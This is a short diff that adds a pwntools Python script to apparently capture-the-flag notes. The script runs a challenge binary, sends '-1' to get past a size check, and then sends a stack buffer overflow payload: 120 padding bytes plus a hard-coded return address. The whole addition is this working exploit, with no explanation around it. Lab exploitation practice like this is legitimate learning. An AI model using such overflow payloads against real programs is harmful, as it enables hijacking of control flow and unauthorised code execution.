@@ -1,6 +1,17 @@
 ## 4
 ### .0
 ```py
+from pwn import *
+context(os='linux',arch='amd64')
+elfpath=os.path.join('/challenge',os.listdir('/challenge')[0])
+io=process(elfpath)
+
+io.sendline('-1')
+
+pl=b'b'*120+p64(0x40229d)
+
+io.send(pl)
+print(io.recvall().decode())
 
 ```
 ### .1
